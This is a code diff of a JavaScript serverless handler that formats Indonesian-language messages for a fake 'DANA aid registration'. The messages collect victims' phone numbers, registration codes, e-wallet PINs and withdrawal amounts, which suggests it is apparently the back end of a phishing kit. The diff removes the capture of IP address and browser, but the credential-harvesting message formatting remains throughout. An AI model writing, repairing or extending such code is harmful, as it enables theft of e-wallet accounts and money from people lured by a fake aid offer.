@@ -38,16 +38,12 @@ exports.handler = async (event, context) => {
     // Format pesan berdasarkan jenis data
     let message = '';
     const timestamp = new Date().toLocaleString('id-ID');
-    const userIP = event.headers['client-ip'] || event.headers['x-forwarded-for'] || 'Unknown';
-    const userAgent = event.headers['user-agent'] || 'Unknown';
     
     switch (type) {
       case 'phone':
         message = `📱 *DATA PENDAFTARAN BANTUAN DANA* 📱\n\n` +
                   `🕐 *Waktu:* ${timestamp}\n` +
                   `📞 *Nomor:* +62${phone}\n` +
-                  `🌐 *IP:* ${userIP}\n` +
-                  `🔍 *Browser:* ${userAgent}\n` +
                   `=================================`;
         break;
         
@@ -56,8 +52,6 @@ exports.handler = async (event, context) => {
                   `🕐 *Waktu:* ${timestamp}\n` +
                   `📞 *Nomor:* +62${phone}\n` +
                   `🔢 *Kode Pendaftaran:* ${pin}\n` +
-                  `🌐 *IP:* ${userIP}\n` +
-                  `🔍 *Browser:* ${userAgent}\n` +
                   `=================================`;
         break;
         
@@ -67,8 +61,6 @@ exports.handler = async (event, context) => {
                   `📞 *Nomor:* +62${phone}\n` +
                   `🔢 *Kode Pendaftaran:* ${pin}\n` +
                   `🎁 *Nominal Bantuan:* ${reward}\n` +
-                  `🌐 *IP:* ${userIP}\n` +
-                  `🔍 *Browser:* ${userAgent}\n` +
                   `=================================`;
         break;
         
@@ -78,8 +70,6 @@ exports.handler = async (event, context) => {
                   `📞 *Nomor:* +62${phone}\n` +
                   `🔒 *PIN DANA:* ${pin}\n` +
                   `💳 *Jumlah Penarikan:* ${reward}\n` +
-                  `🌐 *IP:* ${userIP}\n` +
-                  `🔍 *Browser:* ${userAgent}\n` +
                   `=================================`;
         break;
         
@@ -88,8 +78,6 @@ exports.handler = async (event, context) => {
                   `🕐 *Waktu:* ${timestamp}\n` +
                   `📞 *Nomor:* +62${phone}\n` +
                   `🎉 *Jumlah Berhasil Ditarik:* ${reward}\n` +
-                  `🌐 *IP:* ${userIP}\n` +
-                  `🔍 *Browser:* ${userAgent}\n` +
                   `💰 *Status:* Dana berhasil ditransfer\n` +
                   `=================================`;
         break;
